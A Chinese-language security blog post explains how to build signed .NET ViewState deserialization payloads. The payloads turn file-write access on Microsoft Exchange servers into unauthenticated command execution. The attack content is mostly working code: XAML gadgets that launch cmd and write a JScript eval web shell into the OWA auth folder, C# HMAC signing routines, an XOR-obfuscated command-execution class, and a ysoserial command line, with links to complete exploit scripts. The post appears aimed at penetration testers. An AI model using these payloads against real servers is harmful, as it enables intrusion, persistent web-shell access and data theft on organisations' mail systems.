---
layout: post
title: DotNet反序列化——生成ViewState的程序实现
---


## 0x00 前言
---

在上篇文章《渗透技巧——从Exchange文件读写权限到命令执行》介绍了通过.Net反序列化ViewState从Exchange文件读写权限到命令执行的方法，分享了三种利用脚本的开发细节，本文将要具体分析生成ViewState的细节，介绍另外一种实现从Exchange文件读写权限到命令执行的脚本开发细节

参考资料：

http://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html
https://github.com/pwntester/ysoserial.net

## 0x01 简介
---

本文将要介绍以下内容：

- 两种生成ViewState的实现方法
- 另外一种利用脚本开发的细节
- 开源代码

## 0x02 背景知识
---

### 1.DotNet反序列化ViewState的实现原理

如果能够读取web.config的文件内容，获得其中的加密密钥和算法，就能够构造出有效的序列化数据。如果将序列化数据设置成恶意委托，那么在ViewState使用ObjectStateFormatter进行反序列化调用委托时，就能实现远程代码执行。

### 2.ViewState的生成流程

使用validationkey和generator作为参数，对序列化xaml数据进行签名，并放在序列化xaml数据后，作Base64编码后组成最终的ViewStaten内容

直观理解：

```
data = Serialize(xaml)
ViewState = data + (data+generator).ComputeHash(validationKey)
ViewState = Base64(ViewState)
```

加密细节可参考：

https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs#L255

https://github.com/0xacb/viewgen/blob/master/viewgen#L156

具体细节可使用dnSpy反编译System.Web.dll，找到System.Web.Configuration.MachineKeySection的GetEncodedData函数

## 0x03 两种生成ViewState的实现方法
---

测试环境：

获得了Exchange文件读写权限，能够修改`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\web.config`和`%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\web.config`，设置machineKey的内容如下：

`<machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" />`

对于这两个位置的.Net反序列化命令执行，不再需要合法用户的凭据

下面介绍两种生成ViewState的程序实现方法

### 1.从xaml数据生成ViewState

流程如下：

1. 构造xaml数据
2. 生成序列化xaml数据
3. 生成签名数据
4. 拼接序列化xaml数据和签名数据后作Base64编码

(1)构造xaml数据

这里介绍4种，分别对应4个功能

执行命令：

```
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  xmlns:System="clr-namespace:System;assembly=mscorlib" 
    xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
     <ObjectDataProvider x:Key="" ObjectType="{x:Type Diag:Process}" MethodName="Start" >
     <ObjectDataProvider.MethodParameters>
        <System:String>cmd</System:String>
        <System:String>"/c notepad"</System:String>
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>
```

写文件：

```
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:s="clr-namespace:System;assembly=mscorlib"
    xmlns:w="clr-namespace:System.Web;assembly=System.Web">
  <s:String x:Key="a" x:FactoryMethod="s:Environment.GetEnvironmentVariable" x:Arguments="ExchangeInstallPath"/>
  <s:String x:Key="b" x:FactoryMethod="Concat">
    <x:Arguments>
      <StaticResource ResourceKey="a"/>
      <s:String>FrontEnd\\HttpProxy\\owa\\auth\\xaml.aspx</s:String>
    </x:Arguments>
  </s:String>
  <ObjectDataProvider x:Key="x" ObjectType="{x:Type s:IO.File}" MethodName="WriteAllText">
    <ObjectDataProvider.MethodParameters>
      <StaticResource ResourceKey="b"/>
      <s:String>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
      </s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  <ObjectDataProvider x:Key="c" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""/>
  <ObjectDataProvider x:Key="d" ObjectInstance="{StaticResource c}" MethodName="get_Response"/>
  <ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource d}" MethodName="End"/>
</ResourceDictionary>
```

**注:**

需要注意xaml的转义字符

设置Header：

```
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:s="clr-namespace:System;assembly=mscorlib" 
    xmlns:w="clr-namespace:System.Web;assembly=System.Web">
  <ObjectDataProvider x:Key="a" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""></ObjectDataProvider>
  <ObjectDataProvider x:Key="b" ObjectInstance="{StaticResource a}" MethodName="get_Response"></ObjectDataProvider>
  <ObjectDataProvider x:Key="c" ObjectInstance="{StaticResource b}" MethodName="get_Headers"></ObjectDataProvider>
  <ObjectDataProvider x:Key="d" ObjectInstance="{StaticResource c}" MethodName="Add">
    <ObjectDataProvider.MethodParameters>
      <s:String>TEST-HEADER</s:String>
      <s:String>123456</s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  <ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource b}" MethodName="End"></ObjectDataProvider>
</ResourceDictionary>
```


设置Response：

```
<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:s="clr-namespace:System;assembly=mscorlib" 
    xmlns:w="clr-namespace:System.Web;assembly=System.Web">
  <ObjectDataProvider x:Key="a" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""></ObjectDataProvider>
  <ObjectDataProvider x:Key="b" ObjectInstance="{StaticResource a}" MethodName="get_Response"></ObjectDataProvider>
  <ObjectDataProvider x:Key="c" ObjectInstance="{StaticResource b}" MethodName="Write">
      <ObjectDataProvider.MethodParameters>
      <s:String>123456</s:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>
  <ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource b}" MethodName="End"></ObjectDataProvider>
</ResourceDictionary>
```


(2)生成序列化xaml数据

需要用到Microsoft.PowerShell.Editor.dll

(3)生成签名数据

参考代码：

```
byte[] validationKey= strToToHexByte(key);
uint _clientstateid = 0;
// Converting "generator" from HEX to INT
if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
		System.Environment.Exit(0);
byte[] _mackey = new byte[4];
_mackey[0] = (byte)_clientstateid;
_mackey[1] = (byte)(_clientstateid >> 8);
_mackey[2] = (byte)(_clientstateid >> 16);
_mackey[3] = (byte)(_clientstateid >> 24);
ms = new MemoryStream();
ms.Write(data,0,data.Length);
ms.Write(_mackey,0,_mackey.Length);
byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
```

**注：**

代码修改自https://github.com/zcgonvh/CVE-2020-0688/blob/master/ExchangeCmd.cs#L253

(4)拼接序列化xaml数据和签名数据后作Base64编码

调用`Convert.ToBase64String()`即可

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/XamlToViewState.cs

代码能够读取xaml文件，使用validationkey和generator计算签名，生成最终的ViewState

优点：

流程清晰，便于调试和修改细节

缺点：

需要依赖中间文件Microsoft.PowerShell.Editor.dll，占用空间

**注：**

该方法的完整利用文件已打包上传至github，地址如下：

https://github.com/3gstudent/test/blob/master/XamlToViewState.zip

### 2.从序列化xaml数据生成ViewState

借助ysoserial.net跳过从xaml数据到序列化xaml数据的环节，提高开发效率

流程如下：

(1)修改ysoserial.net源码，直接读取可用的序列化xaml数据

在https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs#L209添加如下代码：

```
Console.WriteLine(payloadString);
Console.WriteLine("The content above is what we need");
Console.WriteLine("-----------");
```

能够在控制台输出Base64编码的序列化xaml数据

编译ysoserial.net，生成ysoserial.exe，在同级目录新建shellPayload.cs，内容如下：

```
class E
{
    static string xor(string s) {
        char[] a = s.ToCharArray();
        for(int i = 0; i < a.Length; i++)
        a[i] = (char)(a[i] ^ 'x');
        return new string(a);
}
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["__Value"];
            cmd = xor(cmd);        
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();            
            output = xor(output);
            context.Response.Write(output);

        } catch (System.Exception) { }
        context.Response.Flush();
        context.Response.End();
    }
}
```

使用ysoserial.exe生成ViewState，命令如下：

```
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "shellPayload.cs;System.Web.dll;System.dll;" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="042A94E8"
```

从输出中获得Base64编码的序列化xaml数据


(2)计算序列化xaml数据的签名，生成最终的ViewState数据

代码如下:

```
static string CreateViewState(byte[] dat,string generator,string key)
{
    MemoryStream ms = new MemoryStream();
    byte[] validationKey= strToHexByte(key);

    uint _clientstateid = 0;
    if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
    {
        System.Environment.Exit(0);
    }
 
    byte[] _mackey = new byte[4];
    _mackey[0] = (byte)_clientstateid;
    _mackey[1] = (byte)(_clientstateid >> 8);
    _mackey[2] = (byte)(_clientstateid >> 16);
    _mackey[3] = (byte)(_clientstateid >> 24);

    ms = new MemoryStream();
    ms.Write(dat,0,dat.Length);
    ms.Write(_mackey,0,_mackey.Length);
    byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
    ms=new MemoryStream();
    ms.Write(dat,0,dat.Length);
    ms.Write(hash,0,hash.Length);
    return Convert.ToBase64String(ms.ToArray());
}
```

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SerializeXamlToViewState.cs

代码实现了从序列化xaml数据计算签名，生成最终的ViewState数据

优点：

占用空间更小，可以直接使用ysoserial.net已有的Payload

缺点：

调试和修改比较麻烦

**注：**

以上两种实现方法的CreateViewState()函数在细节上存在区别，需要注意

## 0x04 另外一种利用脚本开发的细节
---

用来实现从Exchange文件读写权限到命令执行

参照 https://github.com/zcgonvh/CVE-2020-0688/blob/master/ExchangeCmd.cs 的结构，将序列化xaml数据封装在数组中，使用validationkey和generator作为参数，对序列化xaml数据进行签名，组成最终的ViewState内容

完整的实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.cs

代码支持两个位置的反序列化执行，分别为默认存在的文件`%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx`和`%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth\TimeoutLogout.aspx`

代码首先发送[ysoserial.net](https://github.com/pwntester/ysoserial.net)实现ActivitySurrogateDisableTypeCheck的数据，接着能够执行命令并获得命令执行的结果，通过POST方式以参数`__Value`发送数据，通信数据采用逐字符异或加密

支持的功能同[ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py](https://github.com/3gstudent/Homework-of-Python/blob/master/ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py)保持一致

## 0x05 小结
---

本文分析了生成ViewState的细节，介绍了两种生成ViewState的程序实现方法，编写代码实现了另外一种从Exchange文件读写权限到命令执行的利用脚本

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





